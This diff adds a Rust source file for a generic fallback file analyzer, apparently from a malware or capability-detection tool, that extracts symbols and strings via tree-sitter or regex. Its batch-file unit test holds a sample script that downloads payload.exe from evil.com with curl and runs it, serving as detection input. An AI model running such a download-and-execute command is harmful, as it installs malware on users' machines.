@@ -1,0 +1,308 @@
+//! Generic source code analyzer.
+//!
+//! Fallback analyzer for file types without dedicated analyzers.
+//! Uses tree-sitter for symbol extraction where available, otherwise
+//! falls back to basic text/regex-based analysis.
+
+use crate::analyzers::symbol_extraction;
+use crate::analyzers::Analyzer;
+use crate::analyzers::FileType;
+use crate::capabilities::CapabilityMapper;
+use crate::types::*;
+use anyhow::{Context, Result};
+use std::fs;
+use std::path::Path;
+use tree_sitter::Language;
+
+/// Generic analyzer that works with any text file.
+///
+/// For languages with tree-sitter support, extracts symbols via AST.
+/// For all files, extracts strings and runs trait matching.
+pub struct GenericAnalyzer {
+    file_type: FileType,
+    capability_mapper: CapabilityMapper,
+}
+
+impl GenericAnalyzer {
+    pub fn new(file_type: FileType) -> Self {
+        Self {
+            file_type,
+            capability_mapper: CapabilityMapper::empty(),
+        }
+    }
+
+    pub fn with_capability_mapper(mut self, mapper: CapabilityMapper) -> Self {
+        self.capability_mapper = mapper;
+        self
+    }
+
+    /// Get tree-sitter language and call node types for this file type, if available.
+    fn treesitter_config(&self) -> Option<(Language, &'static [&'static str])> {
+        match self.file_type {
+            FileType::Swift => Some((tree_sitter_swift::LANGUAGE.into(), &["call_expression"])),
+            FileType::ObjectiveC => Some((
+                tree_sitter_objc::LANGUAGE.into(),
+                &["message_expression", "call_expression"],
+            )),
+            FileType::Groovy => Some((
+                tree_sitter_groovy::LANGUAGE.into(),
+                &["method_call", "function_call"],
+            )),
+            FileType::Scala => Some((
+                tree_sitter_scala::LANGUAGE.into(),
+                &["call_expression", "method_call"],
+            )),
+            FileType::Zig => Some((tree_sitter_zig::LANGUAGE.into(), &["call_expression"])),
+            FileType::Elixir => Some((tree_sitter_elixir::LANGUAGE.into(), &["call"])),
+            // No tree-sitter for these
+            FileType::Batch | FileType::Unknown => None,
+            // These should use dedicated analyzers, but handle as fallback
+            _ => None,
+        }
+    }
+
+    fn file_type_str(&self) -> &'static str {
+        match self.file_type {
+            FileType::Swift => "swift",
+            FileType::ObjectiveC => "objc",
+            FileType::Groovy => "groovy",
+            FileType::Scala => "scala",
+            FileType::Zig => "zig",
+            FileType::Elixir => "elixir",
+            FileType::Batch => "batch",
+            _ => "unknown",
+        }
+    }
+
+    fn analyze_source(&self, file_path: &Path, content: &str) -> Result<AnalysisReport> {
+        let start = std::time::Instant::now();
+
+        let target = TargetInfo {
+            path: file_path.display().to_string(),
+            file_type: self.file_type_str().to_string(),
+            size_bytes: content.len() as u64,
+            sha256: crate::analyzers::utils::calculate_sha256(content.as_bytes()),
+            architectures: None,
+        };
+
+        let mut report = AnalysisReport::new(target);
+
+        // Add structural feature
+        let (parser_name, description) = if let Some((_, _)) = self.treesitter_config() {
+            (
+                format!("tree-sitter-{}", self.file_type_str()),
+                format!("{} source code", self.file_type_str()),
+            )
+        } else {
+            (
+                "text-analysis".to_string(),
+                format!("{} file (text analysis)", self.file_type_str()),
+            )
+        };
+
+        report
+            .structure
+            .push(crate::analyzers::utils::create_language_feature(
+                self.file_type_str(),
+                &parser_name,
+                &description,
+            ));
+
+        // Try tree-sitter symbol extraction if available
+        let tree = if let Some((language, node_types)) = self.treesitter_config() {
+            symbol_extraction::extract_symbols(content, language.clone(), node_types, &mut report);
+
+            // Also parse for string extraction
+            let mut parser = tree_sitter::Parser::new();
+            if parser.set_language(&language).is_ok() {
+                parser.parse(content, None)
+            } else {
+                None
+            }
+        } else {
+            None
+        };
+
+        // Extract strings (AST-based if we have a tree, regex-based otherwise)
+        self.extract_strings(content, tree.as_ref(), &mut report);
+
+        // Analyze paths and environment variables
+        crate::path_mapper::analyze_and_link_paths(&mut report);
+        crate::env_mapper::analyze_and_link_env_vars(&mut report);
+
+        // Compute basic metrics
+        report.metrics = Some(self.compute_metrics(content));
+
+        // Evaluate all rules (atomic + composite) and merge into report
+        self.capability_mapper.evaluate_and_merge_findings(
+            &mut report,
+            content.as_bytes(),
+            tree.as_ref(),
+        );
+
+        report.metadata.analysis_duration_ms = start.elapsed().as_millis() as u64;
+        report.metadata.tools_used = vec![parser_name];
+
+        Ok(report)
+    }
+
+    fn extract_strings(
+        &self,
+        content: &str,
+        tree: Option<&tree_sitter::Tree>,
+        report: &mut AnalysisReport,
+    ) {
+        if let Some(tree) = tree {
+            // AST-based string extraction
+            self.extract_strings_ast(&tree.root_node(), content.as_bytes(), report);
+        } else {
+            // Regex-based string extraction for files without tree-sitter
+            self.extract_strings_regex(content, report);
+        }
+    }
+
+    fn extract_strings_ast(
+        &self,
+        root: &tree_sitter::Node,
+        source: &[u8],
+        report: &mut AnalysisReport,
+    ) {
+        let mut cursor = root.walk();
+        loop {
+            let node = cursor.node();
+            let kind = node.kind();
+
+            // Common string node types across languages
+            if kind.contains("string")
+                || kind == "string_literal"
+                || kind == "interpreted_string_literal"
+                || kind == "raw_string_literal"
+            {
+                if let Ok(text) = node.utf8_text(source) {
+                    let s = text
+                        .trim_start_matches('"')
+                        .trim_end_matches('"')
+                        .trim_start_matches('\'')
+                        .trim_end_matches('\'')
+                        .trim_start_matches('`')
+                        .trim_end_matches('`');
+                    if !s.is_empty() && s.len() < 10000 {
+                        report.strings.push(StringInfo {
+                            value: s.to_string(),
+                            offset: Some(format!("0x{:x}", node.start_byte())),
+                            string_type: StringType::Literal,
+                            encoding: "utf-8".to_string(),
+                            section: Some("ast".to_string()),
+                        });
+                    }
+                }
+            }
+
+            if cursor.goto_first_child() {
+                continue;
+            }
+            loop {
+                if cursor.goto_next_sibling() {
+                    break;
+                }
+                if !cursor.goto_parent() {
+                    return;
+                }
+            }
+        }
+    }
+
+    fn extract_strings_regex(&self, content: &str, report: &mut AnalysisReport) {
+        // Simple regex-based string extraction for double and single quoted strings
+        let double_quote_re = regex::Regex::new(r#""([^"\\]|\\.){0,1000}""#).unwrap();
+        let single_quote_re = regex::Regex::new(r#"'([^'\\]|\\.){0,1000}'"#).unwrap();
+
+        for cap in double_quote_re.find_iter(content) {
+            let s = cap.as_str().trim_start_matches('"').trim_end_matches('"');
+            if !s.is_empty() {
+                report.strings.push(StringInfo {
+                    value: s.to_string(),
+                    offset: Some(format!("0x{:x}", cap.start())),
+                    string_type: StringType::Literal,
+                    encoding: "utf-8".to_string(),
+                    section: Some("regex".to_string()),
+                });
+            }
+        }
+
+        for cap in single_quote_re.find_iter(content) {
+            let s = cap.as_str().trim_start_matches('\'').trim_end_matches('\'');
+            if !s.is_empty() {
+                report.strings.push(StringInfo {
+                    value: s.to_string(),
+                    offset: Some(format!("0x{:x}", cap.start())),
+                    string_type: StringType::Literal,
+                    encoding: "utf-8".to_string(),
+                    section: Some("regex".to_string()),
+                });
+            }
+        }
+    }
+
+    fn compute_metrics(&self, content: &str) -> Metrics {
+        let text = crate::analyzers::text_metrics::analyze_text(content);
+        Metrics {
+            text: Some(text),
+            ..Default::default()
+        }
+    }
+}
+
+impl Analyzer for GenericAnalyzer {
+    fn analyze(&self, file_path: &Path) -> Result<AnalysisReport> {
+        let bytes = fs::read(file_path).context("Failed to read file")?;
+        let content = String::from_utf8_lossy(&bytes);
+        self.analyze_source(file_path, &content)
+    }
+
+    fn can_analyze(&self, _file_path: &Path) -> bool {
+        // Generic analyzer can attempt to analyze any file
+        true
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use std::path::PathBuf;
+
+    #[test]
+    fn test_generic_batch_analysis() {
+        let analyzer = GenericAnalyzer::new(FileType::Batch);
+        let path = PathBuf::from("test.bat");
+        let code = r#"
+@echo off
+set PATH="%PATH%;C:\malware"
+curl "http://evil.com/payload.exe" -o "payload.exe"
+start payload.exe
+"#;
+        let report = analyzer.analyze_source(&path, code).unwrap();
+
+        // Should extract strings (quoted strings are extracted)
+        assert!(!report.strings.is_empty());
+        // Should have metrics
+        assert!(report.metrics.is_some());
+    }
+
+    #[test]
+    fn test_generic_swift_analysis() {
+        let analyzer = GenericAnalyzer::new(FileType::Swift);
+        let path = PathBuf::from("test.swift");
+        let code = r#"
+import Foundation
+let url = URL(string: "http://example.com")!
+let task = URLSession.shared.dataTask(with: url)
+"#;
+        let report = analyzer.analyze_source(&path, code).unwrap();
+
+        // Should have structural feature
+        assert!(report.structure.iter().any(|s| s.id.contains("swift")));
+        // Should extract strings
+        assert!(!report.strings.is_empty());
+    }
+}
